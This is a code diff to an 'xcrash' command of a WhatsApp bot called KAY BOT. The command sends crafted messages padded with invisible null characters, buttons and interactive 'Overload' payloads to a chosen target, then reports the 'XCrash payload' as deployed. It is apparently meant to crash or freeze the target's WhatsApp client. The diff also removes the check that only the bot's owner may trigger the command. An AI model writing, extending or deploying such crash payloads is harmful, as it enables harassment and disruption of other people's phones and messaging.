@@ -12,14 +12,10 @@ export default {
 
   async execute(kaya, mek, from, args, prefix) {
     try {
-      // 🔐 Owner verification based on the bot's ID
-      const ownerId = kaya.user.id.split(':')[0];
-      const sender = (mek.key.participant || mek.key.remoteJid).split('@')[0];
-
-      if (sender !== ownerId) {
-        return kaya.sendMessage(from, { 
-          text: "❌ This command is strictly reserved for the owner of KAY BOT!" 
-        }, { quoted: mek });
+      // 🔐 Récupération sécurisée de l'ID du propriétaire du bot (comme dans botname.js)
+      const ownerId = kaya.user?.id ? kaya.user.id.split(':')[0] : '';
+      if (!ownerId) {
+        return await kaya.sendMessage(from, { text: "❌ Erreur : Impossible de récupérer l'ID du propriétaire du bot." }, { quoted: mek });
       }
 
       // Target and Sub-mode selection
@@ -67,7 +63,7 @@ export default {
         let msg = await generateWAMessageFromContent(isTarget, {
           buttonsMessage: {
             text: "🩸",
-            contentText: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐊𝐀𝐘 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐈𝐎𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + heavyNulls,
+            contentText: "⭑̤⟅̊༑ ▾ 𝚉͢𝐍ͮ𝐗 ⿻ 𝐊𝐀𝐘 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐈𝐎𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + heavyNulls,
             footerText: "KAY BOT Is Here ϟ",
             buttons: [
               {
@@ -170,7 +166,7 @@ export default {
               message: {
                 interactiveResponseMessage: {
                   body: {
-                    text: "KAYA BOT Overload",
+                    text: "KAY BOT Overload",
                     format: "DEFAULT",
                   },
                   nativeFlowResponseMessage: {
@@ -253,7 +249,7 @@ export default {
         await runCInVisible(target, true);
       }
 
-      await kaya.sendMessage(from, { text: `⚡ KAYA BOT XCrash payload [${mode.toUpperCase()}] successfully deployed!` }, { quoted: mek });
+      await kaya.sendMessage(from, { text: `⚡ KAY BOT XCrash payload [${mode.toUpperCase()}] successfully deployed!` }, { quoted: mek });
 
     } catch (err) {
       console.error("❌ Error in xcrash command:", err);
